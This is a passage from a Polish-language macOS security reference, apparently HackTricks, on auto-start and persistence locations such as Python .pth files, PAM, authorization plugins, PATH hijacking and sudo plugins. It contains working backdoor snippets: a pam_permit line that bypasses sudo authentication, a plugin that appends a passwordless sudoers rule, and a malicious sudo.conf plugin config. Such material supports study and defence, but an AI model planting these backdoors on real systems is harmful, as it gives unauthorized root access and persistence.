Launch Services pobiera deklaracje schematów URL i dokumentów z pliku `Info.plist` zarejestrowanej aplikacji. [Przewodnik rejestracji Apple](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html) informuje, że rejestracja może nastąpić, gdy Finder wykryje aplikację, podczas rozruchu lub logowania albo za pośrednictwem jawnego API rejestracji; samo zapisanie aplikacji w dowolnym miejscu nie gwarantuje natychmiastowego wyzwolenia rejestracji. Po rejestracji otwarcie pasującego adresu URL lub dokumentu może uruchomić wybraną aplikację obsługującą, z uwzględnieniem domyślnego wyboru użytkownika i standardowych kontroli uruchamiania macOS. Obsługiwane API `LSSetDefaultHandlerForURLScheme` zmienia preferowany przez użytkownika program obsługujący URL; nie powoduje automatycznego uruchomienia nowo umieszczonej aplikacji.<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

Żadna aplikacja nie została zarejestrowana ani nie zmieniono preferencji obsługi na badawczym Macu z macOS 26.5.2. Aby przetestować rzeczywisty handler, użyj tymczasowego konta użytkownika, zarejestruj aplikację zawierającą wyłącznie marker i używającą unikalnego schematu, wywołaj jej URL, a następnie usuń aplikację i jej rejestrację.

Szczegółowe informacje o enumerowaniu i nadużywaniu handlerów rozszerzeń plików i schematów URL znajdziesz w:

{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

### Pliki startowe Pythona (`.pth` / `usercustomize` / `sitecustomize`)

Opis: [https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- Przydatne do ominięcia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Uruchamia się podczas startu odpowiedniego interpretera Pythona, gdy włączony jest ten katalog `site`; wyzwalanie nie jest uniwersalne dla środowisk wirtualnych, kompilacji Pythona ani flag startowych
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Działa z uprawnieniami/TCC procesu, który uruchomił interpreter

#### Lokalizacja

- **`$(python3 -m site --user-site)/*.pth`** (kompilacje frameworkowe macOS: `~/Library/Python/<X.Y>/lib/python/site-packages/`)
  - Nie wymaga uprawnień roota (zapisywalne przez użytkownika)
  - **Wyzwalacz**: uruchomienie tej kompilacji Pythona z włączoną lokalizacją użytkownika; moduł `site` przetwarza pliki `.pth` w aktywnych katalogach `site`
- **`<user-site>/usercustomize.py`**
  - Nie wymaga uprawnień roota
  - **Wyzwalacz**: uruchomienie z włączoną lokalizacją użytkownika (automatycznie importowany przez `site`)
- **`<prefix>/site-packages/sitecustomize.py`** (np. `/opt/homebrew/lib/python3.13/site-packages/` lub ścieżki systemowe)
  - Wymagane mogą być uprawnienia roota/administratora, zależnie od lokalizacji interpretera
  - **Wyzwalacz**: uruchomienie interpretera, który uwzględnia ten katalog `site`

#### Opis i wykorzystanie

Podczas uruchamiania Python zwykle importuje `site` i skanuje aktywne katalogi `site-packages` w poszukiwaniu plików `.pth`. Oprócz dodawania ścieżek, wiersz `.pth` zaczynający się od `import ` wykonuje kod Pythona, nawet jeśli wskazany moduł nie jest później używany. Python próbuje także zaimportować `sitecustomize`, a **gdy lokalizacja użytkownika jest włączona** — `usercustomize`.<sup>[[56]](#references)</sup> Wyzwalaczem jest późniejsze uruchomienie interpretera, który widzi zmodyfikowany katalog. `-S` wyłącza przetwarzanie `site`; `-s`, `-I` lub `PYTHONNOUSERSITE` wyłączają warianty dotyczące **lokalizacji użytkownika**. `-I` zasadniczo nie wyłącza globalnego `sitecustomize`. Środowiska wirtualne mogą również wykluczać lokalizację użytkownika. Sprawdź `python3 -m site` dla konkretnego interpretera.

Poniższy PoC uruchomiono na macOS 26.5.2. Na potrzeby tego testu `PYTHONUSERBASE` przenosi lokalizację użytkownika do katalogu tymczasowego; rzeczywista lokalizacja użytkownika nie jest modyfikowana:

```python
import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

Both markers appeared. Powtórzenie z `-s`, `-I` lub `-S` zapobiegło pojawieniu się obu markerów **user-site** w tym teście. Nie testowano `sitecustomize` w globalnym katalogu site.

## Root Sandbox Bypass

> [!TIP]
> Tutaj znajdziesz lokalizacje startowe przydatne do **sandbox bypass**, które pozwalają po prostu wykonać coś przez **zapisanie tego do pliku**, będąc **rootem** i/lub wymagając innych **nietypowych warunków**.

### Periodic

> [!CAUTION]
> **Mechanizm historyczny:** Na maszynie testowej z macOS 26.5.2 nie ma `/usr/sbin/periodic`, `/etc/defaults/periodic.conf`, `/etc/periodic` ani demonów launch `com.apple.periodic-*`. Nie zakładaj, że utworzenie `/etc/periodic` w obecnym systemie spowoduje zaplanowanie jego zawartości. Przed użyciem poniższego przykładu sprawdź, czy w docelowym wydaniu dostępne są zarówno polecenie, jak i włączony scheduler.

Opis: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- Przydatne do sandbox bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Wymagany jest jednak root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
  - Wymagany root
  - **Wyzwalanie**: W odpowiednim terminie
- `/etc/daily.local`, `/etc/weekly.local` lub `/etc/monthly.local`
  - Wymagany root
  - **Wyzwalanie**: W odpowiednim terminie

#### Opis i wykorzystanie

W starszych wydaniach skrypty periodic (**`/etc/periodic`**) były uruchamiane zgodnie z harmonogramem przez **demony launch** w `/System/Library/LaunchDaemons/com.apple.periodic*`. Od macOS Big Sur 11.5 runner periodic uruchamiał skrypty w katalogach periodic jako **właściciel każdego pliku**, zamykając wcześniejszą ścieżkę eskalacji uprawnień.<sup>[[27]](#references)</sup> Poniższe polecenia i listy katalogów przedstawiają historyczny wynik, a nie rezultat testu na macOS 26.5.2.

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

W **`/etc/defaults/periodic.conf`** wskazano inne skrypty okresowe, które zostaną wykonane:

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

W starszych systemach, w których zainstalowano i włączono `periodic` oraz jego launch daemons, `/etc/daily.local`, `/etc/weekly.local` i `/etc/monthly.local` stanowiły dodatkowe ścieżki wykonywania. Nieszkodliwa kontrola tylko do odczytu:

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> Reguła oparta na właścicielu dotyczyła skryptów umieszczonych bezpośrednio w katalogach okresowych. Historyczny wrapper `999.local` źródłował `/etc/daily.local`, `/etc/weekly.local` lub `/etc/monthly.local` bez takiego samego sprawdzenia właściciela; gdy scheduler działał jako root, te lokalne pliki były uruchamiane jako root. To rozróżnienie i zmiana w Big Sur 11.5 zostały opisane w [oryginalnym researchu](https://theevilbit.github.io/beyond/beyond_0019/). Nie należy zakładać, że którakolwiek z tych ścieżek jest aktywna, gdy `periodic` nie występuje.

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Przydatne do ominięcia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
  - Ale potrzebujesz uprawnień root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- Zawsze wymagane są uprawnienia root

#### Opis i Exploitation

Ponieważ PAM jest bardziej ukierunkowany na **persistence** i malware niż na łatwe uruchamianie kodu w macOS, ten blog nie będzie szczegółowo wyjaśniać tej techniki — **przeczytaj writeupy, aby lepiej ją zrozumieć**.<sup>[[28]](#references)</sup>

Sprawdź moduły PAM za pomocą:

```bash
ls -l /etc/pam.d
```

Technika persistence/privilege escalation wykorzystująca PAM jest tak prosta, jak zmodyfikowanie modułu /etc/pam.d/sudo przez dodanie na początku wiersza:

```bash
auth       sufficient     pam_permit.so
```

Będzie to więc **wyglądać mniej więcej** tak:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

I dlatego każda próba użycia **`sudo` zadziała**.

> [!CAUTION]
> Pamiętaj, że ten katalog jest chroniony przez TCC, więc użytkownik najprawdopodobniej zobaczy monit z prośbą o dostęp.

Innym dobrym przykładem jest su — widać tu, że modułom PAM można również przekazywać parametry (a ten plik można też poddać backdoorowaniu):

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Wtyczki autoryzacji

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Przydatne do obejścia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
  - Musisz jednak mieć uprawnienia root i dodać dodatkową konfigurację
- Obejście TCC: ???

#### Lokalizacja

- `/Library/Security/SecurityAgentPlugins/`
  - Wymagane uprawnienia root
  - Konieczne jest również skonfigurowanie bazy danych autoryzacji tak, aby korzystała z wtyczki

#### Opis i wykorzystanie

Możesz utworzyć wtyczkę autoryzacji, która będzie uruchamiana przy logowaniu użytkownika, aby utrzymać persistence. Więcej informacji o tworzeniu takich wtyczek znajdziesz w poprzednich writeupach (zachowaj ostrożność — źle napisana wtyczka może uniemożliwić Ci logowanie i konieczne będzie wyczyszczenie Maca w trybie odzyskiwania).<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**Przenieś** pakiet do lokalizacji, z której ma zostać załadowany:

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

Na koniec dodaj **regułę**, aby załadować tę wtyczkę:

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

**`evaluate-mechanisms`** poinformuje framework autoryzacji, że będzie musiał **wywołać zewnętrzny mechanizm autoryzacji**. Ponadto **`privileged`** sprawi, że zostanie on uruchomiony jako root.

Wywołaj go za pomocą:

```bash
security authorize com.asdf.asdf
```

A następnie grupa **staff** powinna mieć dostęp do **sudo** (sprawdź `/etc/sudoers`, aby to potwierdzić).

### Man.conf

Opis: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Przydatne do obejścia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
  - Wymagane są uprawnienia root, a użytkownik musi użyć man
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`/private/etc/man.conf`**
  - Wymagane uprawnienia root
  - **`/private/etc/man.conf`**: Za każdym razem, gdy używany jest man

#### Opis i exploit

Plik konfiguracyjny **`/private/etc/man.conf`** wskazuje plik binarny/skrypt używany do otwierania plików dokumentacji man. Można więc zmienić ścieżkę do pliku wykonywalnego, aby za każdym razem, gdy użytkownik użyje man do odczytania dokumentacji, uruchamiany był backdoor.<sup>[[31]](#references)</sup>

Na przykład ustaw w **`/private/etc/man.conf`**:

```
MANPAGER /tmp/view
```

A następnie utwórz `/tmp/view` jako:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Przydatne do obejścia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
  - Wymagane są uprawnienia root i działający Apache
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Httpd nie ma entitlements

#### Lokalizacja

- **`/etc/apache2/httpd.conf`**
  - Wymagane uprawnienia root
  - Wyzwalacz: Po uruchomieniu Apache2

#### Opis i Exploit

Możesz wskazać w `/etc/apache2/httpd.conf`, aby załadować moduł, dodając wiersz taki jak:<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

W ten sposób skompilowany moduł zostanie załadowany przez Apache. Trzeba tylko **podpisać go ważnym certyfikatem Apple** albo **dodać nowy zaufany certyfikat** w systemie i **podpisać go** tym certyfikatem.

Następnie, jeśli trzeba, aby upewnić się, że serwer zostanie uruchomiony, możesz wykonać:

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Przykład kodu dla Dylb:

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Przydatne do obejścia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
  - Wymagane są jednak uprawnienia root, uruchomiony auditd i wystąpienie ostrzeżenia
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`/etc/security/audit_warn`**
  - Wymagane uprawnienia root
  - **Wyzwalacz**: Gdy auditd wykryje ostrzeżenie

#### Opis i exploit

Za każdym razem, gdy auditd wykryje ostrzeżenie, skrypt **`/etc/security/audit_warn`** jest **wykonywany**. Możesz więc dodać do niego swój payload.<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

Możesz wymusić ostrzeżenie za pomocą `sudo audit -n`.

### Elementy startowe

> [!CAUTION] > **Ta funkcja jest przestarzała, więc w tych katalogach nie powinno się nic znajdować.**

**StartupItem** to katalog, który powinien znajdować się w `/Library/StartupItems/` lub `/System/Library/StartupItems/`. Po utworzeniu katalog ten musi zawierać dwa konkretne pliki:

1. **Skrypt rc**: skrypt powłoki wykonywany podczas uruchamiania.
2. **Plik plist**, o nazwie `StartupParameters.plist`, zawierający różne ustawienia konfiguracji.

Upewnij się, że zarówno skrypt rc, jak i plik `StartupParameters.plist` znajdują się w katalogu **StartupItem**, aby proces uruchamiania mógł je rozpoznać i użyć.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Nie mogę znaleźć tego komponentu w moim macOS, dlatego więcej informacji znajdziesz w writeupie.

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Wprowadzony przez Apple **emond** to mechanizm logowania, który wydaje się niedopracowany lub być może porzucony, a mimo to pozostaje dostępny. Choć nie przynosi szczególnych korzyści administratorowi Maca, ta mało znana usługa może posłużyć threat actorom za subtelną metodę persistence, prawdopodobnie niezauważoną przez większość administratorów macOS.<sup>[[34]](#references)</sup>

Dla osób świadomych jego istnienia wykrycie złośliwego użycia **emond** jest proste. LaunchDaemon tej usługi szuka skryptów do uruchomienia w jednym katalogu. Można to sprawdzić za pomocą następującego polecenia:

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Lokalizacja

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - Wymagane uprawnienia root
  - **Wyzwalacz**: Z XQuartz

#### Opis i exploit

XQuartz **nie jest już instalowany w macOS**, więc jeśli chcesz uzyskać więcej informacji, sprawdź writeup.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Instalacja kext jest tak skomplikowana, nawet z uprawnieniami root, że nie jest uznawana za praktyczną technikę sandbox-escape ani persistence, chyba że masz exploit.

#### Lokalizacja

Aby zainstalować KEXT jako element startowy, musi on być **zainstalowany w jednej z następujących lokalizacji**:

- `/System/Library/Extensions`
  - Pliki KEXT wbudowane w system operacyjny OS X.
- `/Library/Extensions`
  - Pliki KEXT instalowane przez oprogramowanie firm trzecich

Możesz wyświetlić listę aktualnie załadowanych plików kext za pomocą:

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

Więcej informacji o [**rozszerzeniach jądra znajdziesz w tej sekcji**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Opis: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Lokalizacja

- **`/usr/local/bin/amstoold`**
  - Wymagane uprawnienia root

#### Opis i wykorzystanie

Najwyraźniej plik `plist` z `/System/Library/LaunchAgents/com.apple.amstoold.plist` używał tego pliku binarnego i udostępniał usługę XPC... Problem w tym, że plik binarny nie istniał, więc można było umieścić tam własny plik, a po wywołaniu usługi XPC uruchamiany byłby ten plik.<sup>[[35]](#references)</sup>

Nie mogę już znaleźć tego w moim macOS.

### ~~xsanctl~~

Opis: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Lokalizacja

- **`/Library/Preferences/Xsan/.xsanrc`**
  - Wymagane uprawnienia root
  - **Wyzwalacz**: uruchomienie usługi (rzadko)

#### Opis i wykorzystanie

Najwyraźniej ten skrypt nie jest uruchamiany zbyt często, a nie udało mi się go znaleźć nawet w moim macOS, więc więcej informacji znajdziesz w opisie.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **To nie działa we współczesnych wersjach macOS**

Można tu również umieścić **polecenia, które zostaną wykonane podczas uruchamiania.** Przykład zwykłego skryptu rc.common:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### Zadania rozruchowe launchd

Opis: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- Przydatne do ominięcia sandboxa: [🔴](https://emojipedia.org/large-red-circle) (wymaga root)
- Wymagany root oraz **obejście SIP** albo uprawnienie **`kTCCServiceSystemPolicySysAdminFiles`**/Full Disk Access — zależnie od ścieżki

#### Lokalizacja

`launchd` osadza plist w sekcji **`__TEXT,__config`**, opisującą wczesne „zadania rozruchowe”. Kilka wskazanych skryptów/binarnych plików, które domyślnie **nie istnieją**, może zostać utworzonych przez atakującego:

- Zestaw SIP-bypass: **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
- Zestaw TCC/FDA: **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (`rc.netboot` istnieje wcześniej tylko w Sequoia+)

#### Opis i wykorzystanie

Zrzuć osadzoną tabelę zadań, aby sprawdzić, które pliki uruchomi `launchd` oraz jakie klucze są obsługiwane (`Program`, `ProgramArguments`, `PerformAfterUserspaceReboot`, `RequireSuccess`…):

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

Utworzenie jednego z wymienionych plików (np. `/etc/rc.server`) sprawi, że `launchd` uruchomi go przy następnym restarcie (userspace). Najbardziej przydatne wpisy są ograniczone przez SIP lub wymagają TCC SysAdminFiles/Full Disk Access, więc jest to technika wymagająca uprawnień root i uruchamiana podczas restartu.<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

Zadanie rozruchowe `rc.trampoline` uruchamia podczas startu systemu **binarny plik platformowy (podpisany przez Apple)** zapisany w zmiennej NVRAM `apple-trusted-trampoline`, ale **tylko wtedy, gdy ustawiono argument rozruchowy `rc.trampoline=1`, a SIP jest wyłączone** (obowiązuje limit rozmiaru około 390&nbsp;KB oraz wymóg, by plik nie blokował działania i szybko zwracał kontrolę). Ponieważ wymaga **uprawnień root + wyłączonego SIP + payloadu podpisanego przez Apple**, w praktyce jest to niemal bezużyteczne do utrzymywania dostępu i zostało tu wymienione wyłącznie dla kompletności.<sup>[[41]](#references)</sup>

### /etc/paths i /etc/paths.d (PATH hijack)

- Przydatne do obejścia sandboxa: [🔴](https://emojipedia.org/large-red-circle) (wymaga uprawnień root do zapisu)
- Wymagane uprawnienia root

#### Lokalizacja

- **`/etc/paths`** i **`/etc/paths.d/*`** — odczytywane przez **`path_helper`** (wywoływany z `/etc/zprofile`) w celu zbudowania domyślnego `PATH` przy logowaniu.

#### Opis i wykorzystanie

Oba pliki należą do root. Dodanie na początku katalogu kontrolowanego przez atakującego (przez edycję `/etc/paths` lub umieszczenie pliku w `/etc/paths.d/`) sprawi, że katalog ten znajdzie się na początku `PATH` każdej nowej powłoki logowania. Złośliwy plik binarny o nazwie popularnego polecenia (`ls`, `git`, …) **przesłoni** wówczas oryginalny plik i uruchomi się, gdy ofiara następnym razem wywoła to polecenie.

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### storagekitd SIP Bypass (CVE-2024-44243)

Writeup: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- Przydatne do ominięcia sandboxa: [🔴](https://emojipedia.org/large-red-circle) (wymaga roota)
- Wymagany root; rezultat **omija SIP**. Dotyczy macOS **15.0–15.1**, naprawiono w **15.2**

#### Lokalizacja

- Umieść pakiet systemu plików w **`/Library/Filesystems/`**.

#### Opis i eksploatacja

`storagekitd` ma entitlement **`com.apple.rootless.install.heritable`** i uruchamia pliki binarne pakietów systemu plików z **odziedziczoną** możliwością omijania SIP. Umieszczając złośliwy pakiet systemu plików, atakujący może uruchomić kod z możliwością ominięcia SIP, aby zainstalować **trwałe rozszerzenia jądra** lub zapisywać dane w chronionych przez SIP katalogach `LaunchDaemon` — taka persystencja przetrwa i pokona standardowe zabezpieczenia.<sup>[[46]](#references)</sup> Apple naprawiło ten problem w macOS Sequoia 15.2.

### Wtyczki sudo (/etc/sudo.conf)

Writeup: [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- Przydatne do ominięcia sandboxa: [🔴](https://emojipedia.org/large-red-circle) (do zapisu w `/etc/sudo.conf` wymagany jest root)
- Do instalacji wymagany jest root; wtyczka uruchamia się następnie podczas **każdego wywołania `sudo`** (w kontekście setuid-root)

#### Lokalizacja

- **`/etc/sudo.conf`** — wiersze `Plugin` ładują obiekty współdzielone z **`/usr/libexec/sudo/`** (lub ze ścieżki bezwzględnej). Domyślnie plik nie istnieje (sudo używa wbudowanej polityki), więc jego utworzenie zapewnia czysty punkt podpięcia.

#### Opis i eksploatacja

`sudo` ładuje wtyczki polityki, zatwierdzania i audytu z `/etc/sudo.conf`. Ponieważ `sudo` ma ustawiony bit setuid-root, złośliwa wtyczka w postaci obiektu współdzielonego uruchamia się z **uprawnieniami roota za każdym razem, gdy dowolny użytkownik uruchamia `sudo`** — zapewnia to trwałą persystencję roota, a także pozwala wtyczce obserwować każde polecenie sudo.<sup>[[51]](#references)</sup> macOS zawiera sudo 1.9.x, które obsługuje API wtyczek.

```bash
# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

### CoreMediaIO DAL Plug-Ins

